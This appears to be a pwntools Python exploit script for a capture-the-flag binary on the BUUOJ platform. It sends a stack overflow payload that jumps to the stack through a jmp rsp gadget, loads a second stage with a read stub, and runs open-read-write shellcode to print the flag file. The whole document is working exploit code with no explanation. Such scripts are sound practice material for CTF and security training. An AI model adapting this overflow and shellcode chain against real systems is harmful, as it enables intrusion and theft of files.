from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.buuoj.cn",25349)
# io=process("./bad")
elf=ELF("./bad")

jmp_rsp=0x400a01

jmp_shellcode=asm('''
sub rsp,0x30
jmp rsp
''')

orw_shellcode=asm('''
  push   0x67616c66
  push   0x2
  pop    rax
  mov    rdi,rsp
  xor    rsi,rsi
  syscall 

  mov    rdi,rax
  xor    rax,rax
  mov    rsi,0x123500
  push   0x50
  pop    rdx
  syscall 

  push   0x1
  pop    rax
  xor rdi,rdi
  mov    rsi,0x123500
  push   0x50
  pop    rdx
  syscall
''')

read_shellcode=asm('''
    xor rax,rax
    mov edi,0
    push 0x123000
    pop rsi
    push 0x100
    pop rdx
    syscall              
''')

call_shellcode=asm('''
mov rax,0x123000            
call rax
''')

# gdb.attach(io)
# pause()

io.recvuntil(b"fun!\n")
payload=read_shellcode+call_shellcode
payload=payload.ljust(0x28,b"a")+p64(jmp_rsp)+jmp_shellcode
io.send(payload)


io.recvuntil(b"d!\n")
payload=orw_shellcode
# payload=asm(shellcraft.open("./flag")+shellcraft.read(3,0x123500,0x100)+shellcraft.write(1,0x123500,0x100))
io.send(payload)

io.interactive()